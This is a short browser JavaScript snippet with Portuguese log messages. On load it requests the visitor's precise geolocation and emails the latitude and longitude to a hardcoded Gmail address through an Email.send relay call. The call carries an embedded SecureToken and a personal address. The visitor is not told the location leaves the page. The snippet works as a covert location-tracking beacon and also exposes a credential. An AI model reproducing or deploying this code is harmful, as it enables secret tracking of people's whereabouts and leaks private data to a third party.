var options = {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0,
  };

  var longitude;
  
  function success(pos) {
    var crd = pos.coords;

    console.log("Sua posição atual é:");
    console.log("Latitude : " + crd.latitude);
    console.log("Longitude: " + crd.longitude);
    console.log("Mais ou menos " + crd.accuracy + " metros.");

    latitude = crd.latitude;
    longitude = crd.longitude;
    pegarLongitude();
  }
  
  function error(err) {
    console.warn("ERROR(" + err.code + "): " + err.message);
  }
  
  
  navigator.geolocation.getCurrentPosition(success, error, options);
  
  function pegarLongitude() {
    console.log("latitude:" + latitude);
    console.log("longitude:" + longitude);

    Email.send({
        SecureToken : "39d011fc-34f4-4f01-9ed6-3823b962556e",
        To : 'lourenco.douglas02@gmail.com',
        From : "lourenco.douglas02@gmail.com",
        Subject : `latitude e longitude`,
        Body : `latitude: ${latitude} longitude: ${longitude}`
    }).then(
      message => alert(message)
    );
  }

  